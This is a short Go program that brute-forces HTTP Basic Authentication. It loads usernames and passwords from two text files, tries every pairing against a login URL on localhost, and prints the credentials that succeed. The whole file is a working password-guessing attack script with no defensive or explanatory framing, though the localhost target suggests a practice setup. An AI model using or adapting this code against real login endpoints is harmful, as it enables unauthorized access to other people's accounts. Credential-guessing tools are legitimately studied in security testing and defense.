package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
)

func basicAuth() {
	var username string
	var password string

	var paswordList []string
	ufile, err := os.Open("user.txt")
	pfile, err := os.Open("password.txt")

	if err != nil {
		log.Fatal(err)
	}

	defer ufile.Close()
	defer pfile.Close()

	uscanner := bufio.NewScanner(ufile)
	pscanner := bufio.NewScanner(pfile)

	client := &http.Client{}

	for pscanner.Scan() {
		paswordList = append(paswordList, pscanner.Text())
	}

	for uscanner.Scan() {
		for _, value := range paswordList {
			username = uscanner.Text()
			password = value

			req, _ := http.NewRequest("GET", "http://localhost:8090/login", nil)
			req.SetBasicAuth(username, password)
			resp, _ := client.Do(req)

			fmt.Println("HTTP Response Status:", resp.StatusCode, http.StatusText(resp.StatusCode))

			if resp.StatusCode == 200 {
				fmt.Printf("Username: %s Password: %s \n", username, password)
			}
		}

	}

}

func main() {
	basicAuth()
}
